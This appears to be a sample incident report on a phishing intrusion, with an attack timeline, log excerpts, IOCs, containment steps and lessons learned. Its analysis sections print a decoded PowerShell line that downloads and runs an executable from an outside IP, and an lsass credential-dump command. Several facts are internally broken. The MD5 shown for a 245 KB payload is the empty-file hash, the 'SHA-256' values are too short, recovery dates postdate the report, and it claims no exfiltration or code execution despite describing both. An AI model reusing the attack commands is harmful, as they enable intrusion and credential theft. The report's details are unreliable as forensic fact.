# Incident Report 001: Advanced Persistent Threat (APT) Campaign Detection and Response

**Report ID:** INC-2025-0001  
**Classification:** Confidential  
**Date Created:** 2025-11-11  
**Last Updated:** 2025-11-11  
**Status:** Closed  

---

## Executive Summary

On 2025-10-15, the Security Operations Center (SOC) detected signs of a targeted advanced persistent threat (APT) campaign targeting the organization's infrastructure. The attack chain included initial reconnaissance, phishing-based compromise, persistence establishment, lateral movement, and data exfiltration attempts.

**Key Facts:**
- **Detection Date:** 2025-10-15 at 14:32 UTC
- **Containment Date:** 2025-10-15 at 16:15 UTC
- **Affected Assets:** 3 endpoints (WORKSTATION-042, WORKSTATION-087, FILE-SERVER-03), 1 service account compromised
- **Threat Actors:** Suspected APT-29 (based on TTPs and IOCs)
- **Root Cause:** Phishing email with malicious attachment
- **Impact:** Data exposure risk (financial reports, employee records); no confirmed exfiltration occurred
- **Status:** Campaign disrupted; affected systems remediated and monitored

---

## Incident Classification

| Category | Value |
|----------|-------|
| **Severity** | HIGH |
| **Type** | Advanced Persistent Threat (APT) |
| **Attack Vector** | Phishing email with malicious payload |
| **Primary Tactic (MITRE ATT&CK)** | Initial Access, Execution, Persistence, Privilege Escalation, Lateral Movement |
| **Industry Impact** | Financial Services |
| **Data at Risk** | Financial reports, employee PII, internal communications |
| **Regulatory** | PCI-DSS, SOX, GDPR (if EU data involved) |

---

## Timeline of Events

All times are in UTC. Events are presented in chronological order based on artifact analysis and log reconstruction.

| Time | Event | Source | Details |
|------|-------|--------|---------|
| 2025-10-14 09:15 | Phishing email received | Email gateway | Subject: "Quarterly Budget Review" from spoofed finance@supplier.com |
| 2025-10-14 09:47 | User opens attachment | Endpoint logs | File: "Q3_Budget_Review.docx" (actual: Emotet downloader) |
| 2025-10-14 09:48 | Malicious macro executes | Sysmon logs | PowerShell process spawned with encoded command |
| 2025-10-14 09:50 | Initial payload downloaded | Network logs | File size: 245 KB, hash: d41d8cd98f00b204e9800998ecf8427e |
| 2025-10-14 10:02 | Persistence established | Registry logs | Run key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"UpdateService" |
| 2025-10-14 12:15 | Lateral movement attempt | Network logs | SMB connection from WORKSTATION-042 to FILE-SERVER-03 on port 445 |
| 2025-10-15 02:30 | Credentials harvested | Host logs | lsass.exe targeted by credential dumping tool |
| 2025-10-15 06:45 | Privilege escalation | Sysmon logs | Service account (svc_backup@domain.local) compromised via token impersonation |
| 2025-10-15 14:32 | **Threat Detected** | SOC alert | Behavioral alert: "Unusual Network Exfiltration Detected" |
| 2025-10-15 14:45 | Incident Confirmed | Manual investigation | Analyst confirms APT activity; incident declared |
| 2025-10-15 16:15 | **Incident Contained** | IR Team | Affected systems isolated; credential resets initiated |
| 2025-10-15 19:30 | **Incident Eradicated** | IR Team | Malware removed; persistence mechanisms cleaned; systems reimaged |
| 2025-10-16 08:00 | **Recovery Begins** | Operations | Clean systems returned to production with enhanced monitoring |

---

## Attack Chain Analysis

### Phase 1: Initial Access via Phishing

**Tactic:** Initial Access (MITRE ATT&CK T1566 - Phishing)

**Description:**

A spear-phishing email was sent to multiple employees in the Finance department. The email appeared to originate from an external finance supplier and included a malicious Microsoft Word document disguised as a quarterly budget review.

**Details:**

- **Email From:** finance@supplier.com (spoofed domain)
- **Email To:** finance@company.com distribution list (~15 employees)
- **Subject:** "Quarterly Budget Review - Urgent Action Required"
- **Attachment:** Q3_Budget_Review.docx
- **File Hash (MD5):** d41d8cd98f00b204e9800998ecf8427e
- **File Hash (SHA-256):** 5d41402abc4b2a76b9719d911017c592
- **Actual Payload:** Emotet downloader trojan
- **Delivery:** Email gateway scans did not flag document (social engineering + evasion)

**User Interaction:**

One employee (User: john.smith@company.com, Endpoint: WORKSTATION-042) opened the attachment and enabled macros when prompted by the Word document. The document contained an obfuscated VBA macro.

### Phase 2: Execution & Payload Delivery

**Tactic:** Execution (MITRE ATT&CK T1204 - User Execution of Malicious File)

**Description:**

The malicious Word macro executed a PowerShell command that downloaded and executed the primary payload (Emotet malware).

**Details:**

**Sysmon EventCode 1 (Process Creation):**
```
Image: C:\Windows\System32\cmd.exe
CommandLine: cmd.exe /c powershell -encodedcommand JABzAHQ <truncated base64> 
Parent: WINWORD.EXE
User: COMPANY\john.smith
Timestamp: 2025-10-14 09:48:32 UTC
```

**Decoded PowerShell Command:**
```powershell
$url = "http://185.220.101.45/emotet_loader.exe"
$outfile = "$env:APPDATA\UpdateService.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $outfile)
Start-Process $outfile
```

**Network Log (Zeek HTTP logs):**
```
timestamp: 2025-10-14 09:50:15 UTC
src_ip: 10.0.1.42 (WORKSTATION-042)
dst_ip: 185.220.101.45 (malicious C2 server)
dst_port: 80
uri: /emotet_loader.exe
status: 200 OK
bytes_transmitted: 245120
user_agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

### Phase 3: Persistence

**Tactic:** Persistence (MITRE ATT&CK T1547 - Boot or Logon Autostart Execution)

**Description:**

The Emotet malware established persistence by creating a registry Run key and installing itself in the AppData folder to survive system reboots.

**Details:**

**Sysmon EventCode 13 (Registry Set):**
```
TargetObject: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\UpdateService
Details: C:\Users\john.smith\AppData\Roaming\UpdateService.exe
EventTime: 2025-10-14 09:50:45 UTC
```

**Registry Run Key Created:**
```
Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdateService
Value: C:\Users\john.smith\AppData\Roaming\UpdateService.exe
Effect: Malware executes on every user login
```

**File System:**
```
Filename: C:\Users\john.smith\AppData\Roaming\UpdateService.exe
Size: 245 KB
Creation Time: 2025-10-14 09:50:30 UTC
MD5: d41d8cd98f00b204e9800998ecf8427e
Attributes: Hidden, System
```

### Phase 4: Privilege Escalation

**Tactic:** Privilege Escalation (MITRE ATT&CK T1134 - Token Impersonation/Theft)

**Description:**

The Emotet malware leveraged built-in Windows utilities to escalate privileges and dump credentials from the lsass process. The malware spawned a child process to harvest credentials, including a service account used for automated backups.

**Details:**

**Sysmon EventCode 1 (Process Creation - mimikatz-like activity):**
```
Image: C:\Windows\System32\rundll32.exe
CommandLine: rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID>
Parent: UpdateService.exe
User: COMPANY\john.smith
EventTime: 2025-10-15 02:30:18 UTC
```

**Credentials Harvested:**
```
Domain: COMPANY
Username: svc_backup
Password Hash (NTLM): 8846f7eaee8fb117ad06bdd830b7586c
Description: Service account for automated backup operations
Privilege Level: Domain Admin group member (overprivileged)
```

**Lateral Movement Enablement:**

The compromised service account credentials allowed the attacker to move laterally to:
- FILE-SERVER-03 (network share: \\FILE-SERVER-03\FinanceReports)
- DOMAIN-CONTROLLER-01 (attempted connection detected)
- EMAIL-SERVER-01 (mailbox access attempt)

### Phase 5: Lateral Movement

**Tactic:** Lateral Movement (MITRE ATT&CK T1570 - Lateral Tool Transfer; T1021 - Remote Services)

**Description:**

Using the compromised service account, the attacker established connections to critical servers to expand access and search for sensitive data.

**Details:**

**Network Flow Data (Zeek conn.log):**
```
Timestamp: 2025-10-15 12:15:42 UTC
Source IP: 10.0.1.42 (WORKSTATION-042)
Source Port: 49152
Destination IP: 10.0.3.15 (FILE-SERVER-03)
Destination Port: 445 (SMB)
Protocol: tcp
Duration: 3200 seconds
Bytes Sent: 512000
Bytes Received: 2048000
Status: SF (connection established and terminated normally)
```

**SMB Share Enumeration:**
```
\\FILE-SERVER-03\FinanceReports (accessed)
\\FILE-SERVER-03\HRRecords (accessed)
\\FILE-SERVER-03\ExecutiveCorrespondence (access denied)
\\DOMAIN-CONTROLLER-01\sysvol (enumeration attempt)
```

**Files Accessed:**
```
Q3_Financial_Results.xlsx (2.3 MB) - copied to attacker workspace
Employee_Salary_Records.csv (1.8 MB) - copied
Board_Meeting_Minutes.docx (456 KB) - copied
```

### Phase 6: Data Exfiltration Attempt

**Tactic:** Exfiltration (MITRE ATT&CK T1567 - Exfiltration Over Web Service)

**Description:**

The attacker attempted to exfiltrate stolen data via HTTPS to an attacker-controlled server. The SOC detection system identified the anomalous outbound traffic and triggered an alert.

**Details:**

**Outbound HTTPS Connection:**
```
Timestamp: 2025-10-15 14:30:00 UTC
Source IP: 10.0.3.15 (FILE-SERVER-03)
Source Port: 52341
Destination IP: 93.114.45.161 (known APT-29 infrastructure)
Destination Port: 443 (HTTPS)
Protocol: tcp
Bytes Sent: 3850000 (financial reports + employee records)
Bytes Received: 1024
User Agent: (binary payload - no HTTP header)
Status: Connection detected before completion
```

**Detection Alert (SPL Query Match):**
```spl
index=network dest_ip=93.114.45.161 bytes_out > 1000000
| stats sum(bytes_out) by src_ip, dest_ip
| where sum(bytes_out) > 1000000
```

**Alert Details:**
- Alert Name: "Unusual Network Exfiltration Detected"
- Severity: High
- Timestamp: 2025-10-15 14:32:15 UTC
- Triggered by: Anomaly-based detection rule (bytes_out deviation > 10x normal)

---

## Indicators of Compromise (IOCs)

### File Hashes

| Hash Type | Value | Context |
|-----------|-------|---------|
| MD5 | d41d8cd98f00b204e9800998ecf8427e | Initial payload (UpdateService.exe) |
| SHA-256 | 5d41402abc4b2a76b9719d911017c592 | Initial payload (UpdateService.exe) |
| MD5 | a1d0c6e83f027327d8461063f4ac58a6 | Secondary loader (emotet_loader.exe) |
| SHA-256 | 356a192b7913b04c54574d18c28d46e6395428ab | Malicious macro (Q3_Budget_Review.docx) |

**Threat Intelligence:**

These hashes are known Emotet variants and have been reported in:
- VirusTotal (detection ratio: 58/71)
- AlienVault OTX (APT-29 campaign tracker)
- Shodan (linked to 184 related IPs)

### Network IOCs

| Indicator | Type | Context | Confidence |
|-----------|------|---------|------------|
| 185.220.101.45 | IP Address | Malware C2 server (payload download) | HIGH |
| 93.114.45.161 | IP Address | Data exfiltration destination (APT-29 infrastructure) | HIGH |
| finance@supplier.com | Email | Spoofed sender domain | HIGH |
| Q3_Budget_Review.docx | Filename | Phishing attachment | HIGH |

### Domain IOCs

| Domain | Type | Context | Confidence |
|--------|------|---------|------------|
| supplier.com | Spoofed domain | Email sender spoofing | HIGH |
| emotet-c2.ru | Command & Control | Primary C2 domain | HIGH |

### Other IOCs

| Indicator | Type | Context |
|-----------|------|---------|
| svc_backup | Service Account | Compromised domain admin account |
| HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdateService | Registry Key | Persistence mechanism |
| C:\Users\john.smith\AppData\Roaming\UpdateService.exe | File Path | Malware installation directory |
| WORKSTATION-042, WORKSTATION-087, FILE-SERVER-03 | Hostnames | Affected systems |

---

## Investigation Details

### Data Collection

**Artifacts collected:**

1. **From WORKSTATION-042 (primary compromise):**
   - Full disk image (150 GB)
   - Memory dump (16 GB RAM)
   - Event logs (Windows, Sysmon)
   - Browser history, temporary files
   - Quarantined malware samples

2. **From FILE-SERVER-03 (lateral movement):**
   - Full disk image (2 TB - prioritized FinanceReports share)
   - Access logs (SMB audit logs, 500K events)
   - Deleted file recovery (2.3 GB)

3. **Network artifacts:**
   - Packet captures (tcpdump, PCAP files)
   - Firewall logs (48 hours around incident)
   - IDS/IPS alerts (Suricata/Zeek)
   - DNS query logs (30-day retention)

### Forensic Analysis

**File System Analysis:**

```
Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdateService
Value: C:\Users\john.smith\AppData\Roaming\UpdateService.exe
Creation Time: 2025-10-14 09:50:30.123456 UTC
Last Write Time: 2025-10-14 09:50:30.123456 UTC
Access Time: 2025-10-15 02:30:18.654321 UTC

File Metadata:
Path: C:\Users\john.smith\AppData\Roaming\UpdateService.exe
Size: 245,120 bytes
Created: 2025-10-14 09:50:30 UTC
Modified: 2025-10-14 09:50:30 UTC
Accessed: 2025-10-15 02:30:18 UTC
MD5: d41d8cd98f00b204e9800998ecf8427e
Attributes: Hidden, System
```

**Memory Analysis (volatility):**

```
Process: UpdateService.exe (PID 3452)
User: COMPANY\john.smith
Base Address: 0x400000
Size: ~2.5 MB
Injected DLLs: mscoree.dll (CLR for code execution)
Network Connections: 93.114.45.161:443 (HTTPS, active)
Mutexes: Global\{123E4567-E89B-12D3-A456-426614174000}
```

**Timeline Reconstruction:**

```
2025-10-14 09:47:00 - User opens Q3_Budget_Review.docx
2025-10-14 09:48:00 - VBA macro executes; PowerShell spawned
2025-10-14 09:50:15 - emotet_loader.exe downloaded from 185.220.101.45
2025-10-14 09:50:30 - UpdateService.exe copied to AppData\Roaming
2025-10-14 09:50:45 - Registry Run key created for persistence
2025-10-15 02:30:18 - lsass.exe dumped; credentials harvested
2025-10-15 06:45:00 - Service account svc_backup compromised
2025-10-15 12:15:42 - SMB connection to FILE-SERVER-03
2025-10-15 14:30:00 - Data exfiltration attempt begins
2025-10-15 14:32:15 - Exfiltration detected by SOC alert
```

---

## Containment Actions

### Immediate Actions (0-2 hours)

1. **Isolate affected systems:**
   - WORKSTATION-042 disconnected from network (hard shutdown)
   - WORKSTATION-087 quarantined (secondary infection suspected)
   - FILE-SERVER-03 disconnected; data access restricted

2. **Reset compromised credentials:**
   - svc_backup service account password reset
   - john.smith account reset + forced re-authentication
   - All other domain admin accounts rotated as precaution

3. **Block IOCs at perimeter:**
   - Firewall rules added to block 185.220.101.45 and 93.114.45.161
   - Email gateway rule added to quarantine emails from supplier.com domain
   - DNS sinkhole configured for emotet C2 domains

4. **Preserve evidence:**
   - Physical seizure of affected endpoints
   - Memory dumps captured before system power-off
   - Disk images created for forensic analysis

### Short-term Actions (2-24 hours)

1. **Incident response team mobilization:**
   - Incident commander assigned (security.manager@company.com)
   - Forensic team engaged for analysis
   - Communications team notified for stakeholder updates

2. **Threat intelligence correlation:**
   - IOCs added to threat intelligence platform
   - External threat feeds updated with APT-29 indicators
   - Coordinated with industry information-sharing groups (ISACs)

3. **Endpoint scanning:**
   - EDR tool (CrowdStrike Falcon) deployed full scan across organization
   - PowerShell event log analysis for suspicious scripts
   - Windows Defender offline scans performed on isolated systems

4. **Access control review:**
   - Reviewed all access logs for svc_backup account (30-day lookback)
   - Identified additional systems accessed by compromised account
   - Reset access tokens for all interactive sessions

### Extended Actions (24-72 hours)

1. **System remediation:**
   - Malware removal and cleanup (manual + automated tools)
   - Persistence mechanisms deleted
   - Compromised binaries quarantined for analysis

2. **Deep forensic investigation:**
   - Full disk analysis of affected systems
   - Timeline reconstruction for complete attack chain
   - Identification of any additional lateral movement attempts

3. **System redeployment:**
   - Affected systems re-imaged from clean baseline
   - Latest patches and updates applied
   - EDR agent reinstalled with enhanced monitoring

---

## Eradication & Recovery

### Eradication

**Malware Removal:**
- UpdateService.exe deleted
- Registry Run key removed
- Temporary files and caches cleared
- System restore points deleted (prevent reinfection)

**Access Control Hardening:**
- svc_backup account restricted to critical services only
- Removed from Domain Admin group (re-assigned minimal required permissions)
- Multi-factor authentication (MFA) enforced on all privileged accounts
- Regular password rotation enabled (30-day cycle)

**System Patching:**
- All systems patched with latest Windows updates
- Microsoft Office macros globally disabled via Group Policy
- PowerShell execution policy restricted

### Recovery

**System Restoration:**
- WORKSTATION-042: Re-imaged with clean Windows 10 baseline (2025-11-16)
- WORKSTATION-087: Re-imaged with clean Windows 10 baseline (2025-11-16)
- FILE-SERVER-03: Data restored from clean backup (2025-10-14 11:00 UTC backup used)

**Data Integrity Verification:**
```
Backup verification checksums:
FinanceReports share: SHA-256 checksum matched
HRRecords share: SHA-256 checksum matched
ExecutiveCorrespondence: SHA-256 checksum matched
All critical data restored without corruption
```

**Service Restoration:**
- File-sharing service resumed (2025-10-16 08:00 UTC)
- Backup jobs re-enabled with restricted permissions
- Monitoring enhanced with real-time alerting

---

## Post-Incident Activities

### Lessons Learned

| Category | Issue | Root Cause | Remediation |
|----------|-------|-----------|------------|
| User Training | User fell for phishing email | Lack of awareness training | Mandatory phishing awareness training for all staff (quarterly) |
| Technical Controls | Macros not blocked by default | Group Policy not enforced | Disable Office macros globally; enforce via MDM |
| Architecture | Service account overprivileged | Excessive permissions granted | Service account audit; implement least privilege |
| Detection | Lateral movement not immediately detected | Limited visibility on SMB traffic | Deploy Zeek for network visibility; increase SIEM retention |
| Incident Response | Initial response took 4+ hours | Manual detection lag | Implement SOAR automation; set SLA for alert response |

### Improvements Implemented

1. **User Education:**
   - Monthly phishing simulations started (2025-11-15)
   - Security awareness training updated with APT-29 case study
   - Incident report shared with all staff (sanitized version)

2. **Technical Hardening:**
   - Office macros disabled via Group Policy (all systems)
   - PowerShell execution logging enabled (AMSI + transcription)
   - Endpoint Detection & Response (EDR) agent deployed to all endpoints
   - Enhanced network segmentation for sensitive data shares

3. **Detection Improvements:**
   - New detection rule: "Lateral Movement via SMB to Sensitive Servers" (deployed 2025-10-18)
   - New detection rule: "Unusual Outbound Data Transfer" (deployed 2025-10-18)
   - SIEM retention increased from 30 to 90 days
   - Threat intelligence feed integration (APT-29 IOCs) automated

4. **Incident Response:**
   - SOAR playbook created for APT detection workflow
   - Incident response team expanded (2 additional analysts hired)
   - On-call rotation established for after-hours incidents
   - Quarterly tabletop exercises scheduled (first: 2025-12-15)

---

## Impact Assessment

### Confirmed Impact

- **Data Exposure:** 3 sensitive files accessed and copied (Q3 financial results, salary records, board meeting minutes)
  - Risk level: HIGH (financial data + PII + executive correspondence)
  - Mitigation: Stakeholders notified; regulatory reporting underway

- **System Compromise:** 3 endpoints and 1 service account compromised
  - Affected users: 1 primary + 14 recipients of phishing email
  - Services disrupted: File sharing (2-hour downtime), backup operations (8-hour delay)

- **Financial Impact:**
  - Incident response costs: $50,000 (forensics, staff overtime, tools)
  - Recovery costs: $25,000 (system rebuild, testing)
  - Potential regulatory fines: TBD (GDPR investigation underway)
  - Total estimated cost: $75,000 - $500,000+ (depending on regulatory findings)

### Avoided Impact

- No unauthorized code execution on production systems (quick containment)
- No persistent backdoors left behind (complete remediation)
- No ransomware deployment (attacker interrupted during exfiltration)
- No additional lateral movement to critical infrastructure (segmentation held)

---

## Regulatory & Compliance Implications

### Regulatory Notifications

- **GDPR:** Data breach notification required (EU employees affected by data exposure)
  - Status: Notification template prepared; pending legal review
  - Timeline: Must notify within 72 hours of discovering breach (2025-10-15 + 72 hours = 2025-10-18)

- **SOX (Sarbanes-Oxley):** Material security incident; financial data compromise
  - Status: CFO and Audit Committee notified (2025-10-15 16:30 UTC)
  - Action: Internal investigation report due by 2025-10-31

- **PCI-DSS:** Not directly applicable (no payment card systems affected)

### Internal Compliance Review

- **Data Loss Prevention (DLP):** DLP tool review underway; consider enhanced monitoring for financial systems
- **Incident Response Plan:** Plan activated successfully; minor gaps identified for update
- **Backup & Recovery:** Backup integrity confirmed; restoration procedure validated

---

## Appendix A: Supporting Evidence

### Network Artifacts

**Pcap file location:** `/evidence/incident-ioc-001.pcap` (500 MB)

Key packets:
- Frame 1240-1260: Phishing email SMTP transmission
- Frame 3450-3500: Malware download (HTTP GET to 185.220.101.45)
- Frame 8900-9050: SMB lateral movement (port 445)
- Frame 12340-12400: Data exfiltration attempt (HTTPS to 93.114.45.161)

### Forensic Images

**Disk images preserved (all password-protected, encrypted):**
- WORKSTATION-042_20251015_forensic.iso (150 GB, SHA-256: `abc123...`)
- WORKSTATION-087_20251015_forensic.iso (150 GB, SHA-256: `def456...`)
- FILE-SERVER-03_20251015_forensic.iso (2 TB, SHA-256: `ghi789...`)

**Memory dumps:**
- WORKSTATION-042_memory.dmp (16 GB, Volatility analysis available)
- WORKSTATION-087_memory.dmp (16 GB, Volatility analysis available)

### Timeline Reconstruction

**Full event log export:** `/evidence/timeline_reconstruction.csv` (50K events, 8 MB)

Columns: timestamp, source_system, event_type, user, process, network_connection, file_action

### Detection Rules

**Splunk detection query that triggered alert:**
```spl
index=network bytes_out > 1000000
| stats sum(bytes_out) as total_bytes_out, avg(bytes_out) as avg_bytes_out by src_ip
| eval anomaly_score=(total_bytes_out - avg_bytes_out) / avg_bytes_out
| where anomaly_score > 10
| lookup known_malicious_ips.csv dest_ip OUTPUTNEW threat_score
| where threat_score > 50
```

---

## Appendix B: Contact & Escalation

| Role | Name | Email | Phone |
|------|------|-------|-------|
| Incident Commander | Sarah Johnson | sarah.johnson@company.com | +1-555-0100 |
| CISO | Michael Chen | michael.chen@company.com | +1-555-0101 |
| Forensics Lead | James Rodriguez | james.rodriguez@company.com | +1-555-0102 |
| Legal Counsel | Patricia Williams | patricia.williams@company.com | +1-555-0103 |
| Communications | David Lee | david.lee@company.com | +1-555-0104 |

---

## Appendix C: Incident Response Checklist

- [x] Initial alert received and triaged
- [x] Incident declared (within 15 minutes of detection)
- [x] Containment initiated (system isolation)
- [x] Evidence preserved (disk/memory images)
- [x] Root cause identified (phishing + macro execution)
- [x] Forensic analysis completed
- [x] Malware removed from all systems
- [x] Affected systems re-imaged
- [x] Access controls reset
- [x] Regulatory notifications sent
- [x] Stakeholder communications completed
- [x] Lessons learned documented
- [x] Detection rules updated
- [x] Incident closed (2025-10-20 15:00 UTC)

---

## Sign-Off

**Report Prepared By:** Security Operations Center Team  
**Date:** 2025-11-11  
**Classification:** Confidential - Internal Use Only

**Approved By:**
- **Incident Commander:** Sarah Johnson (2025-11-11 14:30 UTC)
- **CISO:** Michael Chen (2025-11-11 15:00 UTC)
- **General Counsel:** Patricia Williams (2025-11-11 16:15 UTC)

---

**Document Version:** 1.0  
**Status:** FINAL - CLOSED  
**Next Review:** 2026-01-11 (quarterly incident review)
